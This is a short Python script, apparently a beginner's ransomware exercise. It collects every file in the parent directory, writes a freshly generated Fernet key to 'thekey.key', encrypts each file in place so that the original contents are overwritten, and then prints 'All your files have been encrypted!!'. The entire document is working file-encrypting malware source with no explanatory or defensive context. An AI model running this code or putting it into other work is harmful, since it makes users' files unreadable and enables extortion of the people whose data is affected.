#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

#let's find some files

files=[]

for file in os.listdir(".."):
  if os.path.isfile("../"+file):
    files.append("../"+file)

key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
  thekey.write(key)

for file in files:
  with open(file, "rb") as thefile:
    content = thefile.read()
  content_encrypted = Fernet(key).encrypt(content)
  with open(file, "wb") as thefile:
    thefile.write(content_encrypted)  

print("All your files have been encrypted!!") 
